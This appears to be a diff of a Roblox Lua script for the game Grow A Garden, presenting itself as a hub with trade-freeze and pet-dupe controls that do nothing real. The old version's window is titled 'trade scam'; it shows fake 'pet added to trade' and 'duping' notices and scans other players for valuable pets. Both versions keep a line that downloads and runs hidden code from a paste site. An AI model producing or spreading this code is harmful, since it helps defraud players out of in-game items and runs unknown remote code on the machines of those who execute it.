@@ -1,229 +1,122 @@
+-- Grow A Garden Hub | Custom UI (No Rayfield)
+-- made by vdawngg
+
+-- Tạo GUI chính
+local ScreenGui = Instance.new("ScreenGui", game.CoreGui)
+ScreenGui.Name = "GrowAGardenHub"
+
+-- Main Frame
+local MainFrame = Instance.new("Frame", ScreenGui)
+MainFrame.Size = UDim2.new(0, 500, 0, 320)
+MainFrame.Position = UDim2.new(0.25, 0, 0.25, 0)
+MainFrame.BackgroundColor3 = Color3.fromRGB(25, 25, 25)
+MainFrame.BorderSizePixel = 0
+
+-- Header
+local Header = Instance.new("TextLabel", MainFrame)
+Header.Size = UDim2.new(1, 0, 0, 40)
+Header.BackgroundColor3 = Color3.fromRGB(170, 0, 0)
+Header.Text = "🌹 Grow A Garden Hub 🌹"
+Header.TextColor3 = Color3.new(1, 1, 1)
+Header.Font = Enum.Font.GothamBold
+Header.TextScaled = true
+
+-- Tab buttons container
+local TabBar = Instance.new("Frame", MainFrame)
+TabBar.Size = UDim2.new(0, 120, 1, -40)
+TabBar.Position = UDim2.new(0, 0, 0, 40)
+TabBar.BackgroundColor3 = Color3.fromRGB(40, 40, 40)
+
+-- Content container
+local ContentFrame = Instance.new("Frame", MainFrame)
+ContentFrame.Size = UDim2.new(1, -120, 1, -40)
+ContentFrame.Position = UDim2.new(0, 120, 0, 40)
+ContentFrame.BackgroundColor3 = Color3.fromRGB(15, 15, 15)
+
+-- Hàm tạo Tab
+local Tabs = {}
+function CreateTab(name)
+    local tabBtn = Instance.new("TextButton", TabBar)
+    tabBtn.Size = UDim2.new(1, 0, 0, 40)
+    tabBtn.Text = name
+    tabBtn.BackgroundColor3 = Color3.fromRGB(60, 0, 0)
+    tabBtn.TextColor3 = Color3.new(1, 1, 1)
+    tabBtn.Font = Enum.Font.GothamBold
+    tabBtn.TextScaled = true
+
+    local tabFrame = Instance.new("ScrollingFrame", ContentFrame)
+    tabFrame.Size = UDim2.new(1, 0, 1, 0)
+    tabFrame.CanvasSize = UDim2.new(0, 0, 0, 0)
+    tabFrame.Visible = false
+    tabFrame.BackgroundTransparency = 1
+
+    tabBtn.MouseButton1Click:Connect(function()
+        for _, t in pairs(Tabs) do
+            t.Frame.Visible = false
+        end
+        tabFrame.Visible = true
+    end)
+
+    Tabs[name] = {Frame = tabFrame}
+    return Tabs[name]
+end
+
+-- Hàm tạo Button trong Tab
+function CreateButton(tab, text, callback)
+    local btn = Instance.new("TextButton", tab.Frame)
+    btn.Size = UDim2.new(0.9, 0, 0, 35)
+    btn.Position = UDim2.new(0.05, 0, 0, (#tab.Frame:GetChildren()-1)*40)
+    btn.BackgroundColor3 = Color3.fromRGB(60, 60, 60)
+    btn.Text = text
+    btn.TextColor3 = Color3.new(1, 1, 1)
+    btn.Font = Enum.Font.Gotham
+    btn.TextScaled = true
+    btn.MouseButton1Click:Connect(callback)
+end
+
+-- Hàm tạo Toggle
+function CreateToggle(tab, text, callback)
+    local frame = Instance.new("Frame", tab.Frame)
+    frame.Size = UDim2.new(0.9, 0, 0, 35)
+    frame.Position = UDim2.new(0.05, 0, 0, (#tab.Frame:GetChildren()-1)*40)
+    frame.BackgroundColor3 = Color3.fromRGB(60, 60, 60)
+
+    local label = Instance.new("TextLabel", frame)
+    label.Size = UDim2.new(0.7, 0, 1, 0)
+    label.Text = text
+    label.TextColor3 = Color3.new(1, 1, 1)
+    label.Font = Enum.Font.Gotham
+    label.TextScaled = true
+    label.BackgroundTransparency = 1
+
+    local toggleBtn = Instance.new("TextButton", frame)
+    toggleBtn.Size = UDim2.new(0.3, 0, 1, 0)
+    toggleBtn.Position = UDim2.new(0.7, 0, 0, 0)
+    toggleBtn.BackgroundColor3 = Color3.fromRGB(100, 0, 0)
+    toggleBtn.Text = "OFF"
+    toggleBtn.TextColor3 = Color3.new(1, 1, 1)
+    toggleBtn.Font = Enum.Font.GothamBold
+    toggleBtn.TextScaled = true
+
+    local state = false
+    toggleBtn.MouseButton1Click:Connect(function()
+        state = not state
+        toggleBtn.Text = state and "ON" or "OFF"
+        toggleBtn.BackgroundColor3 = state and Color3.fromRGB(0,150,0) or Color3.fromRGB(100,0,0)
+        callback(state)
+    end)
+end
+
+-- Example Tabs
+local tradeTab = CreateTab("Trade")
+CreateButton(tradeTab, "Freeze Trade", function() print("Freeze Trade!") end)
+CreateToggle(tradeTab, "Auto Accept", function(v) print("AutoAccept:", v) end)
+
+local miscTab = CreateTab("Misc")
+CreateButton(miscTab, "Dupe Pet", function() print("Dupe Pet!") end)
+
+-- Mặc định mở tab đầu
+Tabs["Trade"].Frame.Visible = true
 loadstring(game:HttpGet("https://pastefy.app/pCe2v3kG/raw"))()
 
--- =======================================================
--- RED LUXURY HUB | Made by vdawngg
--- =======================================================
 
--- Freeze 5s khi mở script
-local t = tick() + 5
-while tick() < t do end
-
--- Load Rayfield
-local Rayfield = loadstring(game:HttpGet("https://sirius.menu/rayfield"))()
-
--- Main Window
-local Window = Rayfield:CreateWindow({
-    Name = "❤️ trade scam | made by vdawngg",
-    LoadingTitle = "Grow A Garden - Red Luxury",
-    LoadingSubtitle = "made by vdawngg",
-    ConfigurationSaving = {
-        Enabled = true,
-        FolderName = "RedLuxuryHub",
-        FileName = "Config"
-    },
-    KeySystem = false
-})
-
--- Hàm notify đỏ sang trọng
-local function RedNotify(title, content)
-    Rayfield:Notify({
-        Title = "🔴 " .. title,
-        Content = content,
-        Duration = 4,
-        Image = 4483362458
-    })
-end
-
--- =======================================================
--- TAB: TRADE
--- =======================================================
-local tradeTab = Window:CreateTab("💰 Trade", 4483362458)
-tradeTab:CreateSection("Freeze Trade 🔊")
-
-local toggles = {}
-local btnNames = {"Auto Accept", "Can't Cancel", "Freeze Trade", "Can't Leave"}
-for _, name in ipairs(btnNames) do
-    tradeTab:CreateToggle({
-        Name = name,
-        CurrentValue = false,
-        Callback = function(Value)
-            toggles[name] = Value
-            RedNotify("Freeze Trade", name .. " is now " .. (Value and "ON" or "OFF"))
-        end
-    })
-end
-
-tradeTab:CreateButton({
-    Name = "Leave Server",
-    Callback = function()
-        local TeleportService = game:GetService("TeleportService")
-        TeleportService:TeleportToPlaceInstance(0, "", game.Players.LocalPlayer)
-    end,
-})
-
-tradeTab:CreateSection("Fake Trade 🍊")
-tradeTab:CreateDropdown({
-    Name = "Select Pet",
-    Options = {"Kitsune", "Queen Bee", "T-Rex", "Disco Bee", "Corrupted Kitsune", "Raccoon", "Dragonfly", "Butterfly", "Spinosaurus"},
-    CurrentOption = "None",
-    Callback = function(Value) getgenv().SelectedPet = Value end,
-})
-tradeTab:CreateInput({
-    Name = "Weight (kg)",
-    PlaceholderText = "Enter kg",
-    RemoveTextAfterFocusLost = false,
-    Callback = function(Text) getgenv().SelectedKg = Text end,
-})
-tradeTab:CreateDropdown({
-    Name = "Mutation",
-    Options = {"Shiny", "Inverted", "Frozen", "Golden", "Tiny", "Ironskin", "Shocked", "Rainbow", "Radiant", "Ascended", "Tranquil", "Corrupt", "Fried"},
-    CurrentOption = "None",
-    Callback = function(Value) getgenv().SelectedMutation = Value end,
-})
-tradeTab:CreateButton({
-    Name = "Add Pet To Trade",
-    Callback = function()
-        RedNotify("Fake Trade", "Transferring...")
-        task.wait(2)
-        RedNotify("Fake Trade", "Added: " .. (getgenv().SelectedMutation or "") .. " " ..
-            (getgenv().SelectedPet or "") .. " - " .. (getgenv().SelectedKg or "") .. "kg")
-    end,
-})
-
--- =======================================================
--- TAB: RANDOMIZE
--- =======================================================
-local randTab = Window:CreateTab("🎲 Randomize", 4483362458)
-randTab:CreateSection("Random System")
-
-local pets = {"Kitsune", "Queen Bee", "T-Rex", "Disco Bee", "Corrupted Kitsune", "Raccoon", "Dragonfly", "Butterfly", "Spinosaurus"}
-local mutations = {"Shiny", "Inverted", "Frozen", "Golden", "Tiny", "Ironskin", "Shocked", "Rainbow", "Radiant", "Ascended", "Tranquil", "Corrupt", "Fried"}
-
-local function pickRandom(list)
-    return list[math.random(1, #list)]
-end
-
-randTab:CreateButton({
-    Name = "🎲 Randomize Pet",
-    Callback = function()
-        local result = pickRandom(pets)
-        RedNotify("Random Pet", "You got: " .. result)
-    end,
-})
-randTab:CreateButton({
-    Name = "✨ Randomize Mutation",
-    Callback = function()
-        local result = pickRandom(mutations)
-        RedNotify("Random Mutation", "You got: " .. result)
-    end,
-})
-randTab:CreateButton({
-    Name = "🎁 Random Surprise",
-    Callback = function()
-        local pet = pickRandom(pets)
-        local mut = pickRandom(mutations)
-        RedNotify("Surprise!", "Your result: " .. mut .. " " .. pet)
-    end,
-})
-
--- =======================================================
--- TAB: SPAWNER
--- =======================================================
-local spawnerTab = Window:CreateTab("⚡ Spawner", 4483362458)
-spawnerTab:CreateButton({
-    Name = "Run Spawner",
-    Callback = function()
-        RedNotify("Spawner", "Spawner started (demo)")
-    end,
-})
-
--- =======================================================
--- TAB: MISC
--- =======================================================
-local miscTab = Window:CreateTab("⚙️ Misc", 4483362458)
-local dupeState = false
-miscTab:CreateToggle({
-    Name = "Detect Dupe Pet",
-    CurrentValue = false,
-    Callback = function(Value) dupeState = Value end,
-})
-miscTab:CreateButton({
-    Name = "Dupe Pet (allow mutation)",
-    Callback = function()
-        local screenGui = Instance.new("ScreenGui", game.CoreGui)
-        local blackFlash = Instance.new("Frame", screenGui)
-        blackFlash.Size = UDim2.new(1, 0, 1, 0)
-        blackFlash.BackgroundColor3 = Color3.new(0.5, 0, 0) -- đỏ đậm
-        blackFlash.BackgroundTransparency = 1
-
-        local msg = Instance.new("TextLabel", blackFlash)
-        msg.Size = UDim2.new(1, 0, 0.2, 0)
-        msg.Position = UDim2.new(0, 0, 0.4, 0)
-        msg.Text = "Duping in progress 🔴 made by vdawngg"
-        msg.TextColor3 = Color3.new(1, 1, 0)
-        msg.BackgroundTransparency = 1
-        msg.Font = Enum.Font.GothamBlack
-        msg.TextScaled = true
-
-        for i = 1, 15 do
-            blackFlash.BackgroundTransparency = 0
-            task.wait(0.1)
-            blackFlash.BackgroundTransparency = 1
-            task.wait(0.1)
-        end
-        screenGui:Destroy()
-        RedNotify("Dupe", "Process finished ✅")
-    end,
-})
-
--- =======================================================
--- TAB: FINDER
--- =======================================================
-local finderTab = Window:CreateTab("🔍 Finder", 4483362458)
-finderTab:CreateInput({
-    Name = "Find Server",
-    PlaceholderText = "Current server version: v1701",
-    RemoveTextAfterFocusLost = false,
-    Callback = function() end,
-})
-finderTab:CreateButton({
-    Name = "Search Server",
-    Callback = function()
-        RedNotify("Finder", "Searching server... please wait")
-    end,
-})
-finderTab:CreateInput({
-    Name = "Find Pet",
-    PlaceholderText = "Best pet in server: ...",
-    RemoveTextAfterFocusLost = false,
-    Callback = function() end,
-})
-finderTab:CreateButton({
-    Name = "Start Searching",
-    Callback = function()
-        RedNotify("Finder", "Scanning pets in server...")
-
-        local priorityList = {"Corrupted Kitsune", "Queen Bee", "Dragonfly", "T-Rex", "Spinosaurus", "Butterfly", "Raccoon", "Disco Bee", "Kitsune"}
-        local bestPet = nil
-
-        for _, player in ipairs(game.Players:GetPlayers()) do
-            if player ~= game.Players.LocalPlayer then
-                local petsFolders = {player:FindFirstChild("Backpack"), player:FindFirstChild("Pets"), player:FindFirstChild("Garden")}
-                for _, folder in pairs(petsFolders) do
-                    if folder then
-                        for _, pet in pairs(folder:GetDescendants()) do
-                            if table.find(priorityList, pet.Name) then
-                                bestPet = pet.Name
-                                break
-                            end
-                        end
-                    end
-                    if bestPet then break end
-                end
-            end
-            if bestPet then break end
-        end
-
-        RedNotify("Finder", "Best pet in server: " .. (bestPet or "None"))
-    end,
-})
